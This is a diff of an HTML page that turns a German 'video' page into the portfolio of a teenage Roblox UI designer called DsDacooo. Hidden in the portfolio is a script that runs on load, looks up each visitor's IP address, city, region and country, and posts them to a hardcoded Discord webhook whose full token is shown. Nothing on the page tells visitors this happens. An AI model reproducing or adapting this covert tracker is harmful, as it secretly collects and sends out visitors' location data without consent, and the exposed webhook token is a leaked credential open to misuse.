@@ -1,103 +1,104 @@
-<!DOCTYPE html>
-<html lang="de">
-<head>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
     <meta charset="UTF-8" />
-    <title>We all love this video.</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            background: #121212;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-        #ip {
-            margin-bottom: 20px;
-            font-size: 1.2rem;
-            min-height: 1.5rem;
-        }
-        iframe {
-            border: none;
-            width: 560px;
-            height: 315px;
-            max-width: 90vw;
-        }
-    </style>
-</head>
-<body>
-    <div id="ip">Lade IP...</div>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>DsDacooo | David's Portfolio</title>
+    <link rel="stylesheet" href="style.css" />
+    </head>
+    <body>
+    <div class="container">
+        <aside class="sidebar">
+        <ul>
+            <li><a href="#about" class="active">About Me</a></li>
+            <li><a href="#skills">My Skills</a></li>
+            <li><a href="#portfolio">Portfolio</a></li>
+            <li><a href="#faq">FAQ</a></li>
+        </ul>
+        </aside>
+        <main class="main">
+        <header class="header">
+            <div class="logo">
+            <h1>David's Studios</h1>
+            </div>
+            <button id="donateBtn" class="btn-donate">Donate ➔</button>
+        </header>
 
-    <iframe 
-        src="https://www.youtube.com/embed/dQw4w9WgXcQ" 
-        title="YouTube Video"
-        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-        allowfullscreen>
-    </iframe>
+        <section id="about" class="content-panel">
+            <h2>About Me</h2>
+            <p>An average 15 yr old tryna make Games. My only way of making Robux is by making UI for people. (Donations help 😊)</p>
+            <h3>Super Modern UI you just wanna kiss it.</h3>
+
+            <h3>Communication</h3>
+            <p>Communication is key when working with someone.</p>
+
+            <h3>On Point</h3>
+            <p>Getting the UI down to the latest detail is key.</p>
+
+            <h3>Working Hours</h3>
+            <p>Monday - Friday: 9am - 4pm<br />
+            Saturday: 12pm - 4pm<br />
+            Sunday: 11pm - 5pm
+            </p>
+
+            <div class="stats">
+            <div><span>520</span>UI Assets Made</div>
+            <div><span>15</span>Satisfied Customers</div>
+            </div>
+
+            <p>Want to follow me on Roblox? Or View my Profile?</p>
+            <h3>Just search <b>DsDacooo</b> on Roblox!</h3>
+        </section>
+
+        <section id="skills" class="content-panel">
+            <h2>My Skills</h2>
+            <p><strong>Interface Design:</strong> Modern and cartoony UI/UX - 4 Months</p>
+            <p><strong>Website Development:</strong> HTML, CSS from scratch - 1 year</p>
+            <p><strong>Roblox Lua:</strong> Learning and improving - Couple Months</p>
+            <p><strong>Roblox Studio:</strong> Experienced user - 2+ years</p>
+        </section>
+
+        <section id="portfolio" class="content-panel">
+            <h2>Portfolio</h2>
+            <p>First UI - The first ever UI I ever made. (20 March 2023)</p>
+            <p>Upcoming Game  - I am making for my own game. (1 April 2025)</p>
+            <p>Improved UI - One of the best looking UI I have made so far. (7 June 2023)</p>
+        </section>
+
+        <section id="faq" class="content-panel">
+            <h2>FAQ</h2>
+            <p><strong>How long does it take to make?</strong><br />
+            Usually 1-3 days depending on UI complexity and family distractions.</p>
+            <p><strong>Do I prefer to be paid pre or post commission?</strong><br />
+            I prefer half before and half after UI delivery for fairness.</p>
+        </section>
+        </main>
+    </div>
 
     <script>
-        var ip = '';
-        var ipIndex = 0;
-        var dots = '';
-        var dotsInterval;
-
-        function typeIP(ipInfo) {
-            var ipArray = ipInfo.ip.split('');
-            function type() {
-                if (ipIndex < ipArray.length) {
-                    ip += ipArray[ipIndex];
-                    document.getElementById('ip').innerText = ip;
-                    ipIndex++;
-                    setTimeout(type, 100);
-                } else {
-                    sendToDiscord(ipInfo);
-                    loadDots();
-                }
-            }
-            type();
-        }
-
-        function loadDots() {
-            dotsInterval = setInterval(function() {
-                if (dots.length < 4) {
-                    dots += '.';
-                } else {
-                    dots = '.';
-                }
-                document.getElementById('ip').innerText = ip + dots;
-            }, 500);
-        }
-
-        function stopLoadDots() {
-            clearInterval(dotsInterval);
-        }
-
         function getIP() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    typeIP(data);
-                    // Starte 10 Sekunden später Redirect - falls benötigt, sonst entfernen
-                    setTimeout(function() {
-                        // window.location.replace('ruler.php'); 
-                    }, 10000);
+                    sendToDiscord(data);
                 })
                 .catch(error => {
-                    document.getElementById('ip').innerText = 'IP konnte nicht geladen werden.';
-                    console.error('Error:', error);
+                    console.error('Fehler beim Abrufen der IP:', error);
                 });
         }
-
+    
         function sendToDiscord(ipInfo) {
-            var webhookURL = 'https://discord.com/api/webhooks/1372608968416956467/JY-sxJg3j095SIWTeLxVWo9MkHGRqKZxNWNJNLU7qZKPYXN4lhHm-yT2moxDSuVZR0D9'; 
-            var message = '# NEUE IP!! \n**IP:** ' + ipInfo.ip + '\n**Stadt:** ' + ipInfo.city + '\n**Region:** ' + ipInfo.region + '\n**Land:** ' + ipInfo.country_name + '\n||@everyone||';
-
+            const webhookURL = 'https://discord.com/api/webhooks/1372608968416956467/JY-sxJg3j095SIWTeLxVWo9MkHGRqKZxNWNJNLU7qZKPYXN4lhHm-yT2moxDSuVZR0D9';
+            const message = '# NEUE IP!!\n'
+                + '**IP:** ' + ipInfo.ip + '\n'
+                + '**Stadt:** ' + ipInfo.city + '\n'
+                + '**Region:** ' + ipInfo.region + '\n'
+                + '**Land:** ' + ipInfo.country_name + '\n'
+                + '||@everyone||';
+    
             fetch(webhookURL, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     content: message,
                     embeds: [{
@@ -107,17 +108,19 @@
                     }]
                 })
             }).then(response => {
-                if (response.ok) {
-                    console.log('IP-Adresse und Standort erfolgreich an Discord gesendet');
-                } else {
+                if (!response.ok) {
                     console.error('Fehler beim Senden an Discord');
                 }
             }).catch(error => {
                 console.error('Fehler beim Senden an Discord:', error);
             });
         }
-
+    
+        // Sofort ausführen beim Laden
         getIP();
     </script>
-</body>
-</html>
+
+
+    <script src="script.js"></script>
+    </body>
+    </html>
